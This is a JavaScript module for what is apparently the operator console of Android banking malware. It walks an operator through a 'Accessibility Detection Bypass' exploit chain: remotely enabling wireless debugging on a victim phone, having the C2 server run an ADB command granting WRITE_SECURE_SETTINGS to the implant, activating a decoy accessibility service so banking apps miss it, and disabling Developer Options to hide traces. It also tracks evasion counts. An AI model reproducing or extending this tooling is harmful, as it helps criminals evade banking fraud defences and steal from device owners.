'use strict';
/**
 * BypassPanel — Accessibility Detection Bypass
 * Updated for Vue 3 app — uses S store and app-level switchPane.
 */
window.BypassPanel = (() => {

  let _devId   = null;
  let _session = null;
  let _pollTimer = null;

  // ── Public API ────────────────────────────────────────────────────────────
  function open(devId) {
    _devId = devId;
    // Vue 3: navigate to bypass pane through store
    if (window.S) window.S.activePane = 'bypass';
    const host = document.getElementById('bypass-host');
    if (host) { _render(host); loadSession(); }
  }

  function onWsMessage(msg) {
    if ((msg.type === 'bypass_status' || msg.type === 'bypass_update') && msg.dev_id === _devId) {
      _onBypassEvent({ detail: msg });
    }
  }

  // ── Render into #bypass-host ─────────────────────────────────────────────
  function _render(host) {
    if (!host) return;
    const name = (window.S?.devices?.[_devId]?.alias) ||
                 (window.S?.devices?.[_devId]?.info?.model) ||
                 (_devId || '?').slice(0,8);

    host.innerHTML = `
    <div style="overflow:auto;padding:20px;display:flex;flex-direction:column;gap:16px;max-width:760px">

      <div style="display:flex;align-items:center;gap:12px;margin-bottom:4px">
        <button class="btn btn-ghost btn-sm" onclick="window.S&&(window.S.activePane='devices')">← Back</button>
        <div>
          <div style="font-size:15px;font-weight:600">Accessibility Detection Bypass</div>
          <div style="font-size:11px;color:var(--text-2)">Target: <span style="color:var(--accent)">${_esc(name)}</span></div>
        </div>
        <span id="bp-decoy-badge" style="display:none;margin-left:auto;background:rgba(61,186,122,0.15);color:var(--green);font-size:11px;padding:3px 10px;border-radius:20px;border:1px solid rgba(61,186,122,0.3)">✓ Bypass Active</span>
      </div>

      <div class="card" style="padding:12px 14px;border-left:3px solid var(--accent)">
        <div style="font-size:11px;color:var(--text-1);line-height:1.7">
          <strong style="color:var(--text-0)">Exploit chain:</strong>
          Enable Dev Options + Wireless Debugging →
          C2 server connects via ADB over WiFi →
          Grants <code style="color:var(--accent)">WRITE_SECURE_SETTINGS</code> →
          APK swaps its accessibility entry for a system decoy.
          Banking apps scan and see nothing suspicious. Dev Options disabled afterwards.
        </div>
      </div>

      <div style="display:flex;gap:0;margin-bottom:4px" id="bp-steps-row">
        ${_stepBadge(1,'Enable Dev','bp-s1')}${_stepArrow()}
        ${_stepBadge(2,'ADB Grant','bp-s2')}${_stepArrow()}
        ${_stepBadge(3,'Verify','bp-s3')}${_stepArrow()}
        ${_stepBadge(4,'Clean','bp-s4')}
      </div>

      <!-- Step 1 -->
      <div class="card" id="bp-step1">
        <div class="card-header"><span>1️⃣</span><span style="flex:1;margin-left:8px">Enable Wireless Debugging</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            Sends <code>BYPASS_ENABLE_DEV</code> to the device. APK enables Developer Options and Wireless Debugging, then reports IP/port.
          </div>
          <div style="display:flex;gap:8px;align-items:center">
            <button class="btn btn-primary" id="bp-btn-step1" onclick="BypassPanel._step1()">🚀 Enable Wireless Debugging</button>
            <span id="bp-step1-status" style="font-size:11px;color:var(--text-2)"></span>
          </div>
          <div id="bp-adb-info" style="display:none;background:var(--bg-0);border:1px solid var(--border);border-radius:6px;padding:12px;font-family:var(--font-mono);font-size:11px;line-height:2">
            <div>IP: <span id="bpi-ip" style="color:var(--green)"></span></div>
            <div>ADB Port: <span id="bpi-adb" style="color:var(--green)"></span></div>
            <div id="bpi-pair-row" style="display:none">Pairing Port: <span id="bpi-pair" style="color:var(--yellow)"></span></div>
            <div id="bpi-pair-code-row" style="display:none;margin-top:4px">
              Pairing Code: <input id="bpi-code" class="form-input" style="width:100px;display:inline-block;margin-left:6px;font-family:var(--font-mono)" placeholder="6-digit" maxlength="6">
            </div>
          </div>
        </div>
      </div>

      <!-- Step 2 -->
      <div class="card" id="bp-step2" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span>2️⃣</span><span style="flex:1;margin-left:8px">Execute ADB Grant</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            C2 server connects to device and runs:<br>
            <code style="color:var(--accent)">adb shell pm grant com.seguranca.protecao android.permission.WRITE_SECURE_SETTINGS</code>
          </div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="bp-btn-step2" onclick="BypassPanel._step2()">⚡ Execute Grant</button>
            <button class="btn btn-ghost btn-sm" onclick="BypassPanel._step2manual()">📋 Copy Manual Commands</button>
          </div>
          <div id="bp-step2-out" style="display:none;background:var(--bg-0);border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;font-family:var(--font-mono);white-space:pre-wrap;max-height:140px;overflow:auto;color:var(--text-1)"></div>
          <span id="bp-step2-status" style="font-size:11px;color:var(--text-2)"></span>
        </div>
      </div>

      <!-- Step 3 -->
      <div class="card" id="bp-step3" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span>3️⃣</span><span style="flex:1;margin-left:8px">Verify & Activate</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">Confirms the permission landed and activates <strong>AccessibilityDecoy</strong>. Banking apps will see a clean system service.</div>
          <div style="display:flex;gap:8px">
            <button class="btn btn-success" id="bp-btn-step3" onclick="BypassPanel._step3()">✅ Confirm & Activate</button>
          </div>
          <div id="bp-live-status" style="display:none;font-size:11px;border:1px solid var(--border);border-radius:6px;padding:10px 14px;line-height:2">
            <div>Decoy active: <span id="bpl-active" style="font-weight:600"></span></div>
            <div>Evasions: <span id="bpl-count" style="color:var(--green);font-weight:600">0</span></div>
            <div>Last evaded: <span id="bpl-pkg" style="color:var(--text-1)">—</span></div>
          </div>
          <span id="bp-step3-status" style="font-size:11px;color:var(--text-2)"></span>
        </div>
      </div>

      <!-- Step 4 -->
      <div class="card" id="bp-step4" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span>4️⃣</span><span style="flex:1;margin-left:8px">Clean Up (Optional)</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">Disables Developer Options. The bypass <strong>remains active</strong> — WRITE_SECURE_SETTINGS persists across reboots.</div>
          <button class="btn btn-warning" id="bp-btn-step4" onclick="BypassPanel._step4()">🧹 Disable Dev Options & Disconnect</button>
          <div id="bp-step4-out" style="display:none;font-size:11px;color:var(--green)"></div>
        </div>
      </div>

    </div>`;

    document.removeEventListener('nx:bypass', _onBypassEvent);
    document.addEventListener('nx:bypass', _onBypassEvent);
  }

  // ── Step handlers ────────────────────────────────────────────────────────
  function _step1() {
    _setStepStatus(1,'sending…'); _disable('bp-btn-step1');
    if (window.sendWS) sendWS({ type:'cmd', target:_devId, cmd:'BYPASS_ENABLE_DEV', args:{} });
  }

  function _onBypassEvent(e) {
    const { status, data } = e.detail || {};
    if (!status) return;
    if (status==='PAIR_READY'||status==='ENABLING_WIRELESS') { _session=data; _showAdbInfo(data); _setStepDone(1); _enableStep(2); }
    if (status==='FAILED') { _setStepError(1, data?.error||'Failed'); }
    if (status==='GRANT_CONFIRMED'||status==='BYPASSED') { _setStepDone(3); _enableStep(4); _showLiveStatus(); }
    if (status==='CLEANED') { _setStepDone(4); }
  }

  function _showAdbInfo(data) {
    _set('bpi-ip', data.ip||'—'); _set('bpi-adb', data.adb_port||'—');
    if (data.pair_port&&data.need_pair) { _show('bpi-pair-row'); _set('bpi-pair',data.pair_port); _show('bpi-pair-code-row'); }
    _show('bp-adb-info');
    _session = {...(_session||{}), ...data};
  }

  async function _step2() {
    if (!_session?.ip) { if(window.toast) toast('Complete Step 1 first','error'); return; }
    _setStepStatus(2,'executing…'); _disable('bp-btn-step2');
    const pairingCode = document.getElementById('bpi-code')?.value?.trim()||null;
    try {
      const r = await _api(`/api/bypass/${_devId}/execute-all`, 'POST', { ip:_session.ip, adb_port:_session.adb_port||5555, pair_port:_session.pair_port, pairing_code:pairingCode });
      const out = (r.steps||[]).map(s=>`[${s.step}] ${s.ok?'✓':'✗'} ${s.out||''}`).join('\n');
      _showOut('bp-step2-out', out);
      if (r.ok&&r.verified) { _setStepDone(2); _enableStep(3); _setStepStatus(3,'verification sent…'); }
      else { _setStepError(2,'Grant failed — check output'); _enable('bp-btn-step2'); }
    } catch(ex) { _setStepError(2,ex.message); _enable('bp-btn-step2'); }
  }

  function _step2manual() {
    if (!_session?.ip) return;
    const cmds = [
      _session.pair_port ? `adb pair ${_session.ip}:${_session.pair_port} <PAIRING_CODE>` : null,
      `adb connect ${_session.ip}:${_session.adb_port||5555}`,
      `adb -s ${_session.ip}:${_session.adb_port||5555} shell pm grant com.seguranca.protecao android.permission.WRITE_SECURE_SETTINGS`,
    ].filter(Boolean).join('\n');
    navigator.clipboard.writeText(cmds).then(()=>{ if(window.toast) toast('Copied!','success'); });
  }

  async function _step3() {
    _setStepStatus(3,'polling device…'); _disable('bp-btn-step3');
    if (window.sendWS) sendWS({ type:'cmd', target:_devId, cmd:'BYPASS_STATUS', args:{} });
    _startPoll();
  }

  function _showLiveStatus() { _show('bp-live-status'); _show('bp-decoy-badge'); _startPoll(); }

  function _startPoll() {
    clearInterval(_pollTimer);
    _pollTimer = setInterval(()=>{ if(_devId&&window.sendWS) sendWS({type:'cmd',target:_devId,cmd:'BYPASS_STATUS',args:{}}); }, 8000);
  }

  async function _step4() {
    if (!_session?.ip) return;
    _disable('bp-btn-step4'); _setStepStatus(4,'cleaning…');
    try {
      const r = await _api(`/api/bypass/${_devId}/clean`, 'POST', {ip:_session.ip, adb_port:_session.adb_port||5555});
      _showOut('bp-step4-out', r.ok ? '✓ Developer options disabled. Bypass remains active.' : 'Partial clean.');
      if (r.ok) _setStepDone(4);
    } catch(ex) { _setStepError(4,ex.message); }
  }

  async function loadSession() {
    if (!_devId) return;
    try {
      const row = await _api(`/api/bypass/${_devId}/session`);
      if (!row) return;
      _session = row;
      if (['paired','connected','granted','cleaned'].includes(row.status)) { _showAdbInfo(row); _setStepDone(1); _enableStep(2); }
      if (['granted','cleaned'].includes(row.status)) { _setStepDone(2); _setStepDone(3); _enableStep(3); _enableStep(4); _showLiveStatus(); }
      if (row.status==='cleaned') _setStepDone(4);
    } catch {}
  }

  // ── DOM micro-helpers ────────────────────────────────────────────────────
  const _esc  = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  const _$    = id => document.getElementById(id);
  const _set  = (id,v) => { const e=_$(id); if(e) e.textContent=v; };
  const _show = id => { const e=_$(id); if(e) e.style.display=''; };
  const _disable = id => { const e=_$(id); if(e) e.disabled=true; };
  const _enable  = id => { const e=_$(id); if(e) e.disabled=false; };
  const _showOut = (id,t) => { const e=_$(id); if(e){e.textContent=t;e.style.display='';} };

  function _setStepDone(n)      { const e=_$(`bp-s${n}`); if(e){e.style.background='var(--green)';e.style.borderColor='var(--green)';e.style.color='#fff';e.textContent='✓';} _setStepStatus(n,''); }
  function _setStepError(n,msg) { const e=_$(`bp-s${n}`); if(e){e.style.background='var(--red)';e.style.borderColor='var(--red)';e.style.color='#fff';e.textContent='✗';} _setStepStatus(n,msg); }
  function _setStepStatus(n,msg){ const e=_$(`bp-step${n}-status`); if(e) e.textContent=msg; }
  function _enableStep(n)       { const p=_$(`bp-step${n}`); if(p){p.style.opacity='1';p.style.pointerEvents='';} }

  function _stepBadge(n,label,id) {
    return `<div style="display:flex;flex-direction:column;align-items:center;gap:4px;flex:1">
      <div id="${id}" style="width:28px;height:28px;border-radius:50%;background:var(--bg-2);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-2)">${n}</div>
      <div style="font-size:9px;color:var(--text-3);text-transform:uppercase;letter-spacing:0.08em">${label}</div>
    </div>`;
  }
  function _stepArrow() { return `<div style="flex-shrink:0;color:var(--text-3);font-size:14px;padding-top:6px">›</div>`; }

  async function _api(path, method='GET', body) {
    const opts = { method, headers:{'Content-Type':'application/json'} };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(path, opts);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  }

  return {
    open, onWsMessage, _step1, _step2, _step2manual, _step3, _step4,
    _onBypassEvent,
    updateLiveStats(data) {
      _set('bpl-active', data.decoy_active ? '✅ Yes' : '❌ No');
      _set('bpl-count',  data.evade_count  || 0);
      _set('bpl-pkg',    data.last_evaded_pkg || '—');
    }
  };
})();
